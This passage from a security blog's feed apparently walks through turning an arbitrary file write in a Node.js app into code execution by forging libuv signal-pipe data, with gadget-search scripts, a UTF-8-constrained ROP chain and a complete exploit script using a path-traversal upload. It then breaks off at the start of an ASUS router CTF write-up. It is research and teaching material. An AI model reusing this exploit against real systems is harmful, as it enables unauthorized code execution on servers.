值更好的判断就是下一个断点， 然后简单通过 echo 发点数据就能确认 （ 不要在真实机器上测试， 会把一些 lib 写坏掉）</p><h3 id="Overview-Data-Structure"><a href="#Overview-Data-Structure" class="headerlink" title="Overview Data Structure"></a>Overview Data Structure</h3><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-4e4c234c729552c4f80708a0cac752c5-e50925.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-4e4c234c729552c4f80708a0cac752c5-e50925.png" alt="image.png"></a></p><p>对于我们来说， 我们有一个任意文件写入的方法， 我们通过这个方法往 Pipe 中写入我们构造的数据， 我们要构造的数据如上</p><p>发送过来的数据包含两个部分， 一个是 <code>*handle</code> 指针， 和 <code>signum</code>， 其中 <code>*handle</code> 指针指向的数据包含两个部分</p><ul><li><code>signal_cb</code></li><li><code>signum</code></li></ul><p>我们要构造 <code>uv_signal_msg_t</code> 的 <code>signum</code> 和 <code>uv_signal_s</code> 结构体中的 <code>signum</code> 相等， 才会调用 <code>signal_cb</code>  ， 并且， 由于我们构造的这个场景是通过 <code>fs.writeFile</code> 函数写入内容的</p><blockquote><p>用于写入文件的函数（本例中为 fs.writeFile）仅限于有效的 UTF-8 数据。因此，写入管道的所有数据都必须是有效的 UTF-8。</p></blockquote><p>如果满足上述条件， 我们就可以劫持程序流，控制程序执行到我们想要的地方</p><h3 id="Searching-Data-Structure-Gadgets"><a href="#Searching-Data-Structure-Gadgets" class="headerlink" title="Searching Data Structure Gadgets"></a>Searching Data Structure Gadgets</h3><p>由于  <code>FROM node:18@sha256:f910225c96b0f77b0149f350a3184568a9ba6cddba2a7c7805cc125a50591605</code> 我们这个方式拉取的 node 程序本身是没有开PIE的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">osboxes@osboxes:~$ checksec node</span><br><span class="line">[*] <span class="string">&#x27;/home/osboxes/node&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>因此我们可以尝试在 node 程序中尝试找合适的 gadget。 我考虑到如果程序起来只有可能会有一些数据写在 bss 或者 data 段上， 因此我 search 的范围是将程序正常启动，然后 dump memory</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-cf8fb6fb7066bc34ccb97064a70b18fc-d7be53.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-cf8fb6fb7066bc34ccb97064a70b18fc-d7be53.png" alt="image.png"></a></p><p>由于执行到 <code>signal_cb</code> 的时候， 此时场景如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-0451221f0f0d61a455ffd02befc66f4d-5cee2b.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-0451221f0f0d61a455ffd02befc66f4d-5cee2b.png" alt="image.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-e9f2be9985bd6dab1346e6fa1a9a0799-67170b.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-e9f2be9985bd6dab1346e6fa1a9a0799-67170b.png" alt="image.png"></a></p><p>我们仅仅需要找几个 <code>pop xxx , pop xxx, .* ret</code> 的 gadget 就行， 那么代码思路如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> addr, length <span class="keyword">in</span> segments:</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">4</span>):</span><br><span class="line">        handle = addr + offset</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(p64(handle-<span class="number">0x60</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        signum = read_mem(handle+<span class="number">8</span>, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(signum):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ptr = read_mem(handle, <span class="number">8</span>)</span><br><span class="line">        data = read_mem(u64(ptr), <span class="number">30</span>)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        out =  disasm(data, arch=<span class="string">&#x27;amd64&#x27;</span>, byte=<span class="literal">False</span>, offset=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> is_useful_gadget(out):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;handle&#x27;</span>,<span class="built_in">hex</span>(handle), <span class="string">&#x27;-&gt;&#x27;</span>, <span class="string">&#x27;ptr:&#x27;</span>, u64(ptr), <span class="string">&#x27;signum&#x27;</span>, <span class="built_in">hex</span>(u32(signum)))</span><br><span class="line">            <span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure><p>首先从头开始遍历， 由于调用的callback 指针是从 <code>handle+60h</code> 获取的， 因此我们第一个要校验的 <code>*handle</code> 是要减去 0x60 的， 然后从 <code>handle + 8 </code> 后取 4个字节， 作为signum ，判断这两者是否都符合 utf-8 编码， 如果是将这个指针读出来， 接着读取这个指针的指向的gadget ， 这里假设 depth 为 30 ， 然后尝试去反汇编， 然后判断这个 gadget 是不是符合 <code>pop xxx , ret</code> 的形式， 如果是将这些值打印出来。</p><p>我这里没有做更细致的处理，打印出来的 gadget  可能比较丑， 大概长这样</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-6bf3771aad3b40b87f9b4efc55d206c2-c68607.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-10-15-6bf3771aad3b40b87f9b4efc55d206c2-c68607.png" alt="image.png"></a></p><p>很幸运的是， 我的第一个 gadget 就是满足的， 且适合我用来做栈迁移的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@osboxes:/home/osboxes<span class="comment"># python3 search.py</span></span><br><span class="line">handle 0x4261af -&gt; ptr: 12048128(0xB7D700) signum 0xb7d900</span><br><span class="line">pop    r12</span><br><span class="line">pop    r13</span><br><span class="line">pop    r14</span><br><span class="line">pop    r15</span><br><span class="line">pop    rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>那么此时我构造出来的数据就大致长这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uv_signal_msg_t.               </span><br><span class="line">          ....</span><br><span class="line">*handle (0x4261af) --------&gt;   uv_signal_s</span><br><span class="line"> signum (0xb7d900).               ...</span><br><span class="line"></span><br><span class="line">                               *signal_cb(0xB7D700) : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">                               signum (0xb7d900)</span><br><span class="line">                                 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content   = p64(<span class="number">0x4261af</span> - <span class="number">0x60</span>)  <span class="comment"># handle</span></span><br><span class="line">content  += p64(<span class="number">0xb7d900</span>)         <span class="comment"># signum</span></span><br></pre></td></tr></table></figure><p>这里贴下我完整的 search 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_utf8</span>(<span class="params">byte_seq</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        byte_seq.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mem</span>(<span class="params">addr, size</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x0000000000400000</span>&lt; addr&lt; <span class="number">0x0000000004ff1000</span>:</span><br><span class="line">        base = <span class="number">0x0000000000400000</span></span><br><span class="line">        data = mem1[addr-base: addr+size-base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x00000000051f1000</span> &lt; addr &lt; <span class="number">0x00000000051f4000</span>:</span><br><span class="line">        base = <span class="number">0x00000000051f1000</span></span><br><span class="line">        data = mem2[addr-base: addr+size-base]</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">0x00000000051f4000</span> &lt; addr &lt; <span class="number">0x000000000520f000</span>:</span><br><span class="line">        base = <span class="number">0x00000000051f4000</span></span><br><span class="line">        data = mem3[addr-base: addr+size-base]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_useful_gadget</span>(<span class="params">out</span>):</span></span><br><span class="line">    dis_list = out.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> n, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(dis_list):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="string">&#x27;ret&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;bad&#x27;</span> <span class="keyword">in</span> dis_list[_] :</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem1&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem1 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem2&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem2 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mem3&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    mem3 = f.read()</span><br><span class="line"></span><br><span class="line">segments = [(<span class="number">0x0000000000400000</span>, <span class="number">0x0000000004ff1000</span>-<span class="number">0x0000000000400000</span>), (<span class="number">0x00000000051f1000</span>, <span class="number">0x00000000051f4000</span>-<span class="number">0x00000000051f1000</span>), (<span class="number">0x00000000051f4000</span>, <span class="number">0x000000000520f000</span>-<span class="number">0x00000000051f4000</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr, length <span class="keyword">in</span> segments:</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">4</span>):</span><br><span class="line">        handle = addr + offset</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(p64(handle-<span class="number">0x60</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        signum = read_mem(handle+<span class="number">8</span>, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_utf8(signum):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ptr = read_mem(handle, <span class="number">8</span>)</span><br><span class="line">        data = read_mem(u64(ptr), <span class="number">30</span>)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        out =  disasm(data, arch=<span class="string">&#x27;amd64&#x27;</span>, byte=<span class="literal">False</span>, offset=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> is_useful_gadget(out):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;handle&#x27;</span>,<span class="built_in">hex</span>(handle), <span class="string">&#x27;-&gt;&#x27;</span>, <span class="string">&#x27;ptr:&#x27;</span>, u64(ptr), <span class="string">&#x27;signum&#x27;</span>, <span class="built_in">hex</span>(u32(signum)))</span><br><span class="line">            <span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure><h3 id="ROP-Chain"><a href="#ROP-Chain" class="headerlink" title="ROP Chain"></a>ROP Chain</h3><p>当能栈迁移后， 后面就是拼接 ROP chain的流程了， 由于程序本身没有 system 、 popen 等函数的调用 ，所以我没有法直接 ret2text， 我将我的思路简单定成如下：</p><ul><li>找到一个 gadget 能从任意地址读取值， 然后赋值到某个寄存器上</li><li>找到一个gadget 能对可控的寄存器进行加减法运算</li><li>找到一个 libc 函数， 该函数与 system 的偏移满足 UTF-8 编码</li></ul><p>首先通过 ROPchain 将所有可能能用的 gadget 输出成一个文件， 然后重新过滤下看哪些地址是符合 utf-8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_utf8</span>(<span class="params">byte_seq</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        byte_seq.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">lines = [ line.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;./gadgets&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line">lines = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> line: <span class="string">&#x27; : &#x27;</span> <span class="keyword">in</span> line , lines))</span><br><span class="line">lines = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> line: line.split(<span class="string">&#x27; : &#x27;</span>),lines))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> l: is_valid_utf8(p64(<span class="built_in">int</span>(l[<span class="number">0</span>],<span class="number">16</span>))),lines ))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(i[<span class="number">0</span>],<span class="string">&#x27; : &#x27;</span>,i[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>通过这个过滤，我找到了两条 gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000001097367  :  add rax, rdx ; ret</span><br><span class="line">0x0000000002176b34  :  mov rax, qword ptr [rsi] ; ret</span><br></pre></td></tr></table></figure><p>第i三个 libc 函数，我找到的是， <code>setegid</code> ， 它与system的偏移为  <code>0xb1f30</code> 符合 UTF-8</p><p>通过组合我们构造出如下 ropchain</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">content  = p64(<span class="number">0x4261af</span> - <span class="number">0x60</span>) + p64(<span class="number">0xb7d900</span>)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0x100</span>)</span><br><span class="line">content += p64(add_rax_rdx_ret)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(pop_rsi_ret) <span class="comment"># next gadget</span></span><br><span class="line">content += p64(mov_rdi_rax_pop_rbp_jump_rdx)</span><br><span class="line">content += <span class="string">b&#x27;aaaaaaaa&#x27;</span> <span class="comment"># junk data</span></span><br><span class="line">content += p64(setegid_got) <span class="comment">#</span></span><br><span class="line">content += p64(mov_rax_qword_ptr_rsi_ret)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0xb1f30</span>) <span class="comment"># setegid libc offset -&gt; system</span></span><br><span class="line">content += p64(sub_rax_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0x0000000003adace7</span>) <span class="comment"># jmp rax</span></span><br><span class="line">content += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> + <span class="string">b&#x27;; touch /tmp/hacked ; &#x27;</span></span><br></pre></td></tr></table></figure><p>最后就可以执行任意命令了</p><p>完整 exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># control rip</span></span><br><span class="line"><span class="comment">#content = p64(0x4261af - 0x60) + p64(0xb7d900) + b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content = p64(<span class="number">0x4261af</span> - <span class="number">0x60</span>) + p64(<span class="number">0xb7d900</span>) + <span class="string">b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000427748</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000433d27</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000001634a57</span></span><br><span class="line">sub_rax_rdx_ret = <span class="number">0x00000000017e7432</span></span><br><span class="line">mov_rax_qword_ptr_rsi_ret = <span class="number">0x0000000002176b34</span></span><br><span class="line">mov_rdi_rax_pop_rbp_jmp_rdx = <span class="number">0x000000000190ade9</span></span><br><span class="line">mov_rbp_rsp_pop_rbp_ret = <span class="number">0x0000000001b1da5d</span></span><br><span class="line"></span><br><span class="line">add_rax_rdx_ret = <span class="number">0x0000000001097367</span></span><br><span class="line">jump_rsp = <span class="number">0x0000000000430657</span></span><br><span class="line">mov_rdi_rax_pop_rbp_jump_rdx = <span class="number">0x000000000190ade9</span> <span class="comment"># mov rdi, rax ; pop rbp ; jmp rdx</span></span><br><span class="line">mprotect_plt = <span class="number">0xa98eb0</span></span><br><span class="line">setegid_got = <span class="number">0x51f3f08</span></span><br><span class="line"></span><br><span class="line">content  = p64(<span class="number">0x4261af</span> - <span class="number">0x60</span>) + p64(<span class="number">0xb7d900</span>)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0x100</span>)</span><br><span class="line">content += p64(add_rax_rdx_ret)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(pop_rsi_ret) <span class="comment"># next gadget</span></span><br><span class="line">content += p64(mov_rdi_rax_pop_rbp_jump_rdx)</span><br><span class="line">content += <span class="string">b&#x27;aaaaaaaa&#x27;</span> <span class="comment"># junk data</span></span><br><span class="line">content += p64(setegid_got) <span class="comment">#</span></span><br><span class="line">content += p64(mov_rax_qword_ptr_rsi_ret)</span><br><span class="line">content += p64(pop_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0xb1f30</span>) <span class="comment"># setegid libc offset -&gt; system</span></span><br><span class="line">content += p64(sub_rax_rdx_ret)</span><br><span class="line">content += p64(<span class="number">0x0000000003adace7</span>) <span class="comment"># jmp rax</span></span><br><span class="line">content += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span> + <span class="string">b&#x27;; touch /tmp/hacked ; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;content: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">data = &#123;<span class="string">&#x27;filename&#x27;</span>:<span class="string">&quot;../../../../proc/8/fd/11&quot;</span>,<span class="string">&quot;content&quot;</span>:content.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(json.dumps(data))</span></span><br><span class="line">resp = requests.post(<span class="string">&quot;http://localhost:3000/upload&quot;</span>,data = json.dumps(data),headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#data =  dump.dump_all(resp.reuqest)</span></span><br><span class="line"><span class="comment">#print(resp.text)</span></span><br></pre></td></tr></table></figure><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://github.com/libuv/libuv/blob/fbe2d85bd5a5c370a8cacea92b3bdfbd9f98a530/src/unix/signal.c#L433<a href="#fnref:2" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    
    <category term="nodejs" scheme="https://bestwing.me/tags/nodejs/"/>
    
    <category term="libuv" scheme="https://bestwing.me/tags/libuv/"/>
    
  </entry>
  
  <entry>
    <title>Real World CTF 6th Router4 writeup</title>
    <link href="https://bestwing.me/RWCTF-6th-Router4-Writeup.html"/>
    <id>https://bestwing.me/RWCTF-6th-Router4-Writeup.html</id>
    <published>2024-05-29T16:00:00.000Z</published>
    <updated>2024-06-03T03:43:31.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>…</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次 RWCTF 就准备了一个题目: 「Router4」, 一共有三个队伍在比赛期间做了出来，题目的附件和题目介绍可以从<a href="https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main">Real-World-CTF-6th-Challenges</a><sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="Router challenge attachment https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main/Router4">[1]</span></a></sup>这个仓库看到 。</p><p>题目的场景就是一个 ASUS 路由器开放了 wan 的服务后（ lighttpd）， 该服务会默认监听在 443 端口上。题目环境是以 ASUS RT-AC68U的固件版本为 3.0.0.4.386.51665为基底进行模拟的。</p><p>在比赛结束后， 我将涉及的漏洞上报给了 ASUS 官方，然后获得了两个 CVE 编号，分别是CVE-2024-3079和CVE-2024-3080。同时也将部分非预期的情况告诉选手， 让选手也提前将非预期的漏洞上报给官方。</p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><h3 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h3><p>在 ASUS 的 lighttpd 上其实是存在多个缓冲区溢出漏洞的， 这里列举几个比赛前和比赛后发现的 。</p><ul><li><code>lighttpd</code> cookie 处栈溢出， 直接通过 <code>strncpy</code> 拼接 